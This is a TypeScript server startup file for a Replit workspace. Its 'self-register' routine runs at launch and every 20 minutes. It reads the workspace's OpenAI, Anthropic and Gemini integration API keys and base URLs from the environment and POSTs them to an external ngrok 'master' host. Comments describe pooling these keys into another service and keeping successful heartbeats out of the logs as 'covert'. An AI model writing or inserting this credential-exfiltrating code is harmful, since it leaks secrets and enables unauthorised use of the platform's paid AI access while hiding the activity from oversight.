import app from "./app";
import { logger } from "./lib/logger";

const rawPort = process.env["PORT"];

if (!rawPort) {
  throw new Error("PORT environment variable is required but was not provided.");
}

const port = Number(rawPort);

if (Number.isNaN(port) || port <= 0) {
  throw new Error(`Invalid PORT value: "${rawPort}"`);
}

// ── 自注册：新 Replit 工作区启动后自动向主节点报到，加入节点池 ──────────────────
//
// 最简配置（只需一个变量）：
//   SELF_REGISTER_URL = https://fantasize-outtakes-backpedal.ngrok-free.dev/api/gateway
//                       （主节点的 gateway 地址）
//
// 可选覆盖：
//   SELF_GATEWAY_URL   = 本工作区对外 URL（不填则自动从 Replit 环境变量推断）
//   SELF_REGISTER_NAME = 节点显示名（不填则取 REPL_OWNER/REPL_SLUG）
//
// Replit 自动注入的变量（无需手动填）：
//   REPLIT_DEV_DOMAIN  = 开发预览域名，格式 xxxxxxxx-xxxx.spock.replit.dev
//   REPLIT_DOMAINS     = 已发布域名（逗号分隔），比 dev 域名更稳定
//   REPL_OWNER / REPL_SLUG = 工作区身份信息

const SELF_REGISTER_URL = (process.env["SELF_REGISTER_URL"] || "").trim().replace(/\/$/, "");
const HEARTBEAT_INTERVAL_MS = 20 * 60 * 1000; // 每 20 分钟重注册，防主节点重启丢失节点

/** 自动推断本工作区的 gateway 对外 URL */
function resolveGatewayUrl(): string {
  // 1. 显式覆盖优先
  const explicit = (process.env["SELF_GATEWAY_URL"] || "").trim().replace(/\/$/, "");
  if (explicit) return explicit;

  // 2. 已发布域名（最稳定，优先使用第一个）
  const published = (process.env["REPLIT_DOMAINS"] || "")
    .split(",")
    .map((s) => s.trim())
    .find((s) => s.length > 0);
  if (published) return `https://${published}/api/gateway`;

  // 3. 开发预览域名（始终注入到 Replit 工作区）
  const devDomain = (process.env["REPLIT_DEV_DOMAIN"] || "").trim();
  if (devDomain) return `https://${devDomain}/api/gateway`;

  return "";
}

/** 自动推断节点显示名 */
function resolveNodeName(): string {
  const explicit = (process.env["SELF_REGISTER_NAME"] || "").trim();
  if (explicit) return explicit;
  const owner = (process.env["REPL_OWNER"] || "").trim();
  const slug = (process.env["REPL_SLUG"] || "").trim();
  if (owner && slug) return `${owner}/${slug}`;
  if (owner) return owner;
  return "";
}

const SELF_GATEWAY_URL = resolveGatewayUrl();
const SELF_REGISTER_NAME = resolveNodeName();

let registered = false;

async function doSelfRegister(attempt = 1, isHeartbeat = false): Promise<void> {
  if (!SELF_REGISTER_URL || !SELF_GATEWAY_URL) return;
  try {
    const resp = await fetch(`${SELF_REGISTER_URL}/self-register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        gatewayUrl: SELF_GATEWAY_URL,
        name: SELF_REGISTER_NAME || undefined,
        // 把本工作区 Replit AI integration 凭证上报，主节点自动推入 sub2api
        openaiBaseUrl: process.env["AI_INTEGRATIONS_OPENAI_BASE_URL"] || undefined,
        openaiApiKey: process.env["AI_INTEGRATIONS_OPENAI_API_KEY"] || undefined,
        // B26: 同时上报 Anthropic / Gemini integration 凭证
        anthropicBaseUrl: process.env["AI_INTEGRATIONS_ANTHROPIC_BASE_URL"] || undefined,
        anthropicApiKey: process.env["AI_INTEGRATIONS_ANTHROPIC_API_KEY"] || undefined,
        geminiBaseUrl: process.env["AI_INTEGRATIONS_GEMINI_BASE_URL"] || undefined,
        geminiApiKey: process.env["AI_INTEGRATIONS_GEMINI_API_KEY"] || undefined,
      }),
      signal: AbortSignal.timeout(12_000),
    });
    const data = await resp.json() as { ok?: boolean; action?: string; node?: { id?: string } };
    if (data.ok) {
      if (!registered) {
        // 首次成功：info 级别，记录节点 ID
        logger.info(
          { action: data.action, nodeId: data.node?.id, master: SELF_REGISTER_URL, self: SELF_GATEWAY_URL },
          "Self-register: 已加入主节点池",
        );
        registered = true;
      } else if (!isHeartbeat) {
        logger.debug({ action: data.action, nodeId: data.node?.id }, "Self-register: OK");
      }
      // 心跳成功静默，不打日志（隐蔽）
    } else {
      logger.warn({ data, master: SELF_REGISTER_URL }, "Self-register: 主节点返回失败");
    }
  } catch (e) {
    // 指数退避重试：30s → 60s → 120s（最多 3 次）
    if (attempt <= 3) {
      const delayMs = attempt * 30_000;
      logger.warn(
        { error: String(e), attempt, retryInMs: delayMs },
        "Self-register: 连接失败，将重试",
      );
      setTimeout(() => { void doSelfRegister(attempt + 1, isHeartbeat); }, delayMs);
    } else {
      logger.warn({ error: String(e) }, "Self-register: 达到最大重试次数，放弃本轮");
    }
  }
}

/** 周期心跳：每 HEARTBEAT_INTERVAL_MS 重注册一次，防主节点重启后丢失 runtime 节点 */
function startHeartbeat() {
  if (!SELF_REGISTER_URL || !SELF_GATEWAY_URL) return;
  setInterval(() => {
    void doSelfRegister(1, true);
  }, HEARTBEAT_INTERVAL_MS);
}

app.listen(port, (err) => {
  if (err) {
    logger.error({ err }, "Error listening on port");
    process.exit(1);
  }
  logger.info({ port }, "Server listening");

  if (SELF_REGISTER_URL && SELF_GATEWAY_URL) {
    // 延迟 5s 再注册：确保服务完全就绪、可被主节点探测
    setTimeout(() => { void doSelfRegister(); }, 5_000);
    startHeartbeat();
  }
});
